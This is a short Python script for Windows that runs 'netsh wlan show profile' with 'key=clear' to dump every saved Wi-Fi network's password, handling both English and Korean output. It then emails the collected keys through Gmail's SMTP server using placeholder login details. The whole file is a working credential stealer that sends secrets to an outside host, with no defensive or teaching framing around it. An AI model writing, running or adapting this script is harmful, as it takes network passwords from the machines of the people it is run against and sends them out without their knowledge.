#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, msg) :
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_en_list = re.findall("(?:Profile\s*:\s)(.*)",networks)
network_names_ko_list = re.findall("(?:프로필\s*:\s)(.*)",networks)

result = ""
if network_names_en_list :
    for network_names in network_names_en_list :
        command = "netsh wlan show profile " + network_names + " key=clear"
        current_result = subprocess.check_output(command,shell=True)
        result += current_result
elif network_names_ko_list :
    for network_names in network_names_ko_list :
        command = "netsh wlan show profile " + network_names + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result += current_result
else :
    print("[-] Not Found!! ")
send_mail("test@gmail.com","test_email_password",result)
